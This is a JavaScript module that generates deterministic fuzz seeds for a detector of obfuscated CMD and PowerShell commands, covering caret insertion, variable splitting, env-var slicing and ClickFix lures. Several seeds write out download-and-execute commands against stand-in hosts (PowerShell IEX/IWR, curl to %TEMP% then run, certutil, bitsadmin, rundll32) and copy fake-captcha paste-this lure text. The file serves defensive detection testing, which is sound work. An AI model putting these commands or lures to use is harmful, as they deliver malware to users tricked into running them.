'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/cmd-grammar.js — deterministic seed generator for CMD + PowerShell
// obfuscation (the cmd-obfuscation.js + ps-mini-evaluator.js surfaces).
//
// The `cmd-obfuscation.js` finder emits both CMD-flavoured and PowerShell-
// flavoured candidates — the two interleave in real droppers and the post-
// processor treats them uniformly. The separate `powershell-obfuscation`
// target exists so the per-technique table can attribute PowerShell hits
// cleanly; this module covers the CMD surface only (plus the ClickFix
// wrapper, which is CMD-shaped).
//
// Each seed is a Buffer whose `_expectedSubstring` (attached via
// `makeSeed`) names a token that MUST appear in the decoder's
// `candidate.deobfuscated` output. The fuzz target asserts presence as a
// soft counter — a regression in decoding surfaces as `expectedMiss++`
// on the per-technique JSONL dump, not as a hard crash.
// ════════════════════════════════════════════════════════════════════════════

const CMD_TECHNIQUE_CATALOG = Object.freeze([
  'CMD Caret Insertion',
  'CMD Caret Insertion (nested)',
  'CMD Variable Concatenation',
  'CMD Delayed-Expansion Indirection',
  // "Env Var Substring" has three source sites the default (non-
  // bruteforce) fuzz path can reach:
  //   inline   — %VAR:~N,M% welded into a word (no surrounding space)
  //   resolved — a line with ≥3 tokens, ALL resolvable against KNOWN_ENV_VARS
  //   partial  — a line with ≥3 tokens, at least one resolvable AND at
  //              least one unresolvable (mixed-resolution → (partial) tier)
  // The fourth branch (structural, zero resolved) is gated by
  // `this._bruteforce` in cmd-obfuscation.js:754 and is unreachable
  // from this target; intentionally absent from the catalog.
  'CMD Env Var Substring (inline)',
  'CMD Env Var Substring',
  'CMD Env Var Substring (partial)',
  'CMD Env Var (argv0)',
  // "for /f" indirect execution — piping dynamic output into a callable
  // (`for /f %i in ('…') do call %i`). Same bruteforce-gating applies
  // to the (structural) tier in cmd-obfuscation.js:582 → omitted here.
  'CMD for /f Indirect Execution',
  'CMD for /f Indirect Execution (partial)',
  'CMD ClickFix Wrapper',
  // ── Phase 1 additions ────────────────────────────────────────────
  // `set /a X=<num>` block whose per-variable ASCII codepoints spell
  // a command + `call :label <args>` indirection whose body names a
  // LOLBin. See AGENTS.md pain-points (Phase 1 pending SHAs).
  'CMD set /a Arithmetic-to-Character',
  'CMD call :label Indirection',
]);

// Tiny xorshift32 PRNG — deterministic per seed, no Math.random.
function makeRng(seed) {
  let s = (seed | 0) || 0xC1D5EED0;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Branch generators ──────────────────────────────────────────────────────
// Keep each one small; variety comes from parameter sweeps, not branch logic.

function genCaretInsertion(rng) {
  // Inject carets between letters of a sensitive keyword. Count varies
  // so nested (`^^`) and simple (`^`) both fire.
  const keywords = ['powershell', 'whoami', 'certutil', 'rundll32', 'mshta', 'regsvr32', 'bitsadmin'];
  const out = [];
  for (const kw of keywords) {
    // Simple caret insertion
    const letters = kw.split('');
    const withCarets = letters.join('^');
    out.push(makeSeed(`cmd /c ${withCarets} -Command "Get-Process"`, kw));
    // Nested double-caret form (for /f indirection)
    const doubled = letters.join('^^');
    out.push(makeSeed(`for /f "delims=" %X in ('echo ${doubled}') do %X`, kw));
    // Variable prefix/suffix carets
    const carets = '^'.repeat(1 + rng.int(3));
    out.push(makeSeed(`echo ${carets}${withCarets}${carets} args`, kw));
  }
  return out;
}

function genVariableConcat(rng) {
  // set a=pow & set b=ershell & %a%%b% - the canonical CMD var-split.
  const out = [];
  const targets = ['powershell', 'whoami', 'calc.exe', 'netstat'];
  for (const tgt of targets) {
    const splits = [];
    // Split the target into 2-4 pieces at random boundaries
    const pieces = 2 + rng.int(3);
    const positions = [];
    for (let i = 1; i < pieces; i++) positions.push(1 + rng.int(tgt.length - 1));
    positions.sort((a, b) => a - b);
    positions.unshift(0);
    positions.push(tgt.length);
    const parts = [];
    for (let i = 0; i < positions.length - 1; i++) {
      parts.push(tgt.slice(positions[i], positions[i + 1]));
    }
    const names = parts.map((_, i) => `v${i}`);
    for (let i = 0; i < parts.length; i++) {
      splits.push(`set ${names[i]}=${parts[i]}`);
    }
    const invoke = names.map(n => `%${n}%`).join('');
    out.push(makeSeed(splits.join('&&') + ' && ' + invoke, tgt));
  }
  return out;
}

function genDelayedExpansion() {
  // setlocal enabledelayedexpansion + !var! / !%VAR%! indirection.
  //
  // Two distinct decoder branches fire here:
  //   • The `!x!` form exercises the line-level variable-concatenation
  //     resolver (emits "CMD Variable Concatenation").
  //   • The mixed `!%VAR%!` form specifically targets the delayed-
  //     expansion indirection regex `/(?:!%([\w^]+)%!){2,}/` in
  //     `src/decoders/cmd-obfuscation.js` — which requires AT LEAST
  //     TWO adjacent mixed tokens to fire.
  return [
    makeSeed(
      'setlocal enabledelayedexpansion\nset x=powershell\n!x! -Command "whoami"',
      'powershell',
    ),
    makeSeed(
      'setlocal enabledelayedexpansion & set cmd=calc.exe & !cmd!',
      'calc.exe',
    ),
    // Delayed-expansion INDIRECTION — two adjacent !%VAR%! tokens.
    // Resolves to 'powershell' which trips SENSITIVE_CMD_KEYWORDS.
    makeSeed(
      'setlocal enabledelayedexpansion\n'
      + 'set A=power\nset B=shell\n'
      + 'cmd /c !%A%!!%B%!',
      'powershell',
    ),
    // Three-way indirection — exercises the {2,} quantifier's inner
    // iteration and the vname lookup fallthrough.
    makeSeed(
      'setlocal enabledelayedexpansion\n'
      + 'set P=pow\nset Q=er\nset R=shell\n'
      + '!%P%!!%Q%!!%R%! /c whoami',
      'powershell',
    ),
  ];
}

function genEnvVarSubstring() {
  // %COMSPEC:~N,M% — slice known env vars to reconstruct LOLBin tokens.
  // The decoder's KNOWN_ENV_VARS table maps COMSPEC → `C:\\Windows\\System32\\cmd.exe`
  // (27 chars). Offsets into that string:
  //   positions 11–16 → "System"
  //   positions 20–22 → "cmd"
  //   positions 24–26 → "exe"
  //   last 4 chars    → ".exe"
  const out = [];
  // Slice out "cmd" from COMSPEC (at offset 20, length 3).
  out.push(makeSeed('%COMSPEC:~20,3% /c whoami', 'cmd'));
  // Slice out ".exe"
  out.push(makeSeed('echo %COMSPEC:~-4%', '.exe'));
  // Slice "System" from COMSPEC
  out.push(makeSeed('%COMSPEC:~11,6%', 'System'));
  // Combined several slices — positions 20,3 + 22,1 = "cmd" + "d" = "cmdd"
  out.push(makeSeed(
    'set f=%COMSPEC:~20,3%%COMSPEC:~22,1%',
    'cmdd',
  ));
  // Inline: %VAR:~N,M% welded into a surrounding word — no whitespace
  // on either side. cmd-obfuscation.js:434 requires the post-resolution
  // word to match SENSITIVE_CMD_KEYWORDS. "cmd.exe" qualifies; welding
  // "cmd" slice into a ".exe" literal produces `cmd.exe` in one word.
  out.push(makeSeed(
    'set p=pre%COMSPEC:~20,3%.exe',
    'cmd.exe',
  ));
  // Mixed-resolution line: 3 tokens, two COMSPEC slices (resolvable) +
  // one bogus-name token (unresolvable) → triggers the (partial) tier
  // in cmd-obfuscation.js:752 where resolvedCount > 0 && unresolvedCount > 0.
  // The decoded line keeps `cmd` and `d` verbatim and replaces the third
  // token with `⟨DOESNOTEXIST:~0,3⟩`; the expected substring is preserved.
  out.push(makeSeed(
    '%COMSPEC:~20,3% %COMSPEC:~22,1% %DOESNOTEXIST:~0,3%',
    'cmd',
  ));
  return out;
}

function genArgv0() {
  // CMD Env Var (argv0) — bare `%COMSPEC%` / `%SystemRoot%\System32\cmd.exe`
  // in argv0 position. The decoder (cmd-obfuscation.js ~line 400)
  // recognises ONLY `COMSPEC` / `SYSTEMROOT` / `WINDIR` here and
  // additionally requires the tail to contain ` /x` or ` -x`
  // (switch-style argument) — otherwise the bare var is interpreted
  // as a documentation echo and suppressed.
  //
  // (The prior seed emitted `%~f0` / `%~nx0` — batch-script
  // self-reference syntax — which is a different concept the finder
  // doesn't model.)
  return [
    makeSeed('%COMSPEC% /c whoami', 'cmd.exe'),
    makeSeed(
      '%SystemRoot%\\System32\\cmd.exe /c powershell -NoP -C "whoami"',
      'cmd.exe',
    ),
    // After a `&` separator — argv0 regex anchors at line-start OR
    // after `&&` / `&` / `|` / `||` / `(` / `)`.
    makeSeed(
      'echo starting & %COMSPEC% /c curl http://evil.example.com/x',
      'cmd.exe',
    ),
    // Caret-split var name — the decoder strips carets before the
    // COMSPEC / SYSTEMROOT match.
    makeSeed(
      '%Co^m^s^p^ec% /c whoami',
      'cmd.exe',
    ),
  ];
}

function genClickFix() {
  // ClickFix = "Run dialog" social-engineering wrapper: user is told
  // to paste a line into Win+R. The finder in cmd-obfuscation.js
  // requires ALL THREE of:
  //   (a) a delivery vector — any sensitive CMD/PS decode candidate;
  //   (b) a ClickFix cue phrase — Win+R / Ctrl+V / paste / captcha
  //       / "I'm not a robot" / "click to verify" (CLICKFIX_CUES);
  //   (c) a trailing `echo "…"` with ≥3 consecutive spaces in the
  //       quoted body (trailingEchoRe) — the hallmark of lure-page
  //       payloads that embed a `echo '   ✓ Verification complete'`
  //       to hide the pasted command below the visible scroll.
  //
  // The previous seeds satisfied (a) + (b) but lacked (c), so the
  // 3-of-3 gate never fired.
  return [
    makeSeed(
      '# Press Win+R then paste the following and press Enter\n'
      + 'powershell -NoP -Command "IEX(IWR https://evil.example.com/p.ps1)"\n'
      + 'echo "   ✓ Verification complete"',
      'powershell',
    ),
    makeSeed(
      'Verify you are human: Ctrl+V the command into Windows Run dialog:\n'
      + 'cmd /c curl http://attacker.example.com/x -o %TEMP%\\x.exe && %TEMP%\\x.exe\n'
      + 'echo "    Please wait while we verify your browser   "',
      'curl',
    ),
    makeSeed(
      'I\'m not a robot — paste below:\n'
      + 'powershell.exe -NoP -W Hidden -C "& { IEX (IWR -UseB http://e.example/p) }"\n'
      + 'echo "      Loading captcha …      "',
      'powershell',
    ),
  ];
}

function genForFIndirect() {
  // CMD `for /f` indirect execution — inner command is the real payload.
  // Three tiers map to three decoder branches (cmd-obfuscation.js:578–582):
  //   resolved (all inner %VAR% tokens resolvable) → "Indirect Execution"
  //   partial  (≥1 resolvable AND ≥1 unresolvable) → "Indirect Execution (partial)"
  //   structural (zero resolved)                   → bruteforce-only, omitted
  return [
    // All-resolved: inner references %COMSPEC% (KNOWN_ENV_VARS) only.
    makeSeed(
      'for /f "delims=" %X in (\'%COMSPEC% /c whoami\') do call %X',
      'cmd.exe',
    ),
    // Partial: inner mixes %COMSPEC% (resolvable) with %UNKNOWNVAR%
    // (unresolvable, not a single-letter for-variable so it counts).
    makeSeed(
      'for /f "delims=" %X in (\'%COMSPEC% /c %UNKNOWNVAR%\') do call %X',
      'cmd.exe',
    ),
  ];
}


// ── Phase 1 additions ─────────────────────────────────────────────────────

function genSetAArithmetic() {
  // A block of `set /a X=<num>` assigns whose per-variable values
  // spell a command when concatenated. `set /a` only accepts numeric
  // literals (decimal / 0xHH) to stay inside the single-integer
  // branch of the decoder — expressions like `%X%+1` are ignored.
  const out = [];
  const cmds = ['whoami', 'powershell', 'certutil', 'rundll32'];
  for (const cmd of cmds) {
    // Decimal form
    const dec = cmd.split('').map((c, i) => `set /a V${i}=${c.charCodeAt(0)}`).join(' & ');
    out.push(makeSeed(`${dec} & echo done`, cmd));
    // Hex form (mix) — exercises the 0xNN parse path
    const hex = cmd.split('').map((c, i) => `set /a V${i}=0x${c.charCodeAt(0).toString(16)}`).join(' & ');
    out.push(makeSeed(`${hex}\n`, cmd));
    // Quoted form (`set /a "X=N"`) — exercises the quoted-assign branch
    const quoted = cmd.split('').map((c, i) => `set /a "V${i}=${c.charCodeAt(0)}"`).join('\n');
    out.push(makeSeed(`${quoted}\n`, cmd));
  }
  return out;
}

function genCallLabelIndirection() {
  // `call :<label>` + `:<label>` definition body that names a LOLBin.
  const out = [];
  out.push(makeSeed(
    [
      '@echo off',
      'call :runit',
      'goto :eof',
      ':runit',
      'powershell.exe -NoProfile -Command "Invoke-Expression (iwr http://e/p)"',
      'goto :eof',
    ].join('\n'),
    'powershell',
  ));
  out.push(makeSeed(
    [
      '@echo off',
      'call :a',
      'call :b "http://evil.example/p.exe"',
      ':a',
      'certutil -urlcache -f http://e/p.exe p.exe',
      ':b',
      'rundll32.exe %1,DllRegisterServer',
    ].join('\n'),
    'certutil',
  ));
  out.push(makeSeed(
    [
      ':fetch',
      'bitsadmin /transfer j /priority normal http://e/p.exe %TEMP%\\p.exe',
      'call :fetch',
    ].join('\n'),
    'bitsadmin',
  ));
  return out;
}


function generateCmdSeeds() {
  const rng = makeRng(0xC1D5EED0);
  return [
    ...genCaretInsertion(rng),
    ...genVariableConcat(rng),
    ...genDelayedExpansion(),
    ...genEnvVarSubstring(),
    ...genArgv0(),
    ...genForFIndirect(),
    ...genClickFix(),
    // Phase 1 additions
    ...genSetAArithmetic(),
    ...genCallLabelIndirection(),
  ];
}

module.exports = { generateCmdSeeds, CMD_TECHNIQUE_CATALOG };
